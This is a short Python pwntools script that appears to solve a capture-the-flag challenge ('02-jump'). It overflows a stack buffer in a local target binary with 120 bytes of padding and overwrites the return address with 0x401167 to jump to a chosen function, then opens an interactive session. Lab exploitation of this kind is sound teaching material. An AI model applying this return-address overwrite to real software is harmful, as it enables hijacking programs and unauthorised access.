#!/usr/bin/env python3
from pwn import *

# p = process(['strace', './target'], stderr=2)
p = process( '/challenges/02-jump/target')
e = ELF('./target')
win_addr = p64(0x401167)
payload = b"A" * 112
payload += b"B" * 8
payload+= win_addr
print(payload)
p.send(payload)
p.interactive()
